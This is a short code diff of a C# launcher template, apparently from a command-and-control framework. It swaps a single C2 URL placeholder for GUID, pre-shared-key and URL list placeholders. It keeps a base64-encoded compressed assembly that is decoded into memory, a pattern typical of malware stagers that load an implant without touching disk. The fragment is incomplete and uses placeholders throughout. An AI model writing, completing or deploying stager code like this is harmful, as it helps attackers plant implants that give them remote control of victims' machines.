@@ -7,10 +7,12 @@ public class CLASS_NAME
 {
     public static void Main()
     {
-        string url = "C2_URL";
+        string guid = "GUID";
+        string psk = "PSK";
+        string urls = "URLS";
         string b64 = "BASE64_ENCODED_ASSEMBLY";
 
-        string[] args = new string[] { url };
+        string[] args = new string[] { guid, psk, urls };
         byte[] compressed = System.Convert.FromBase64String(b64);
         using (MemoryStream inputStream = new MemoryStream(compressed.Length))
         {
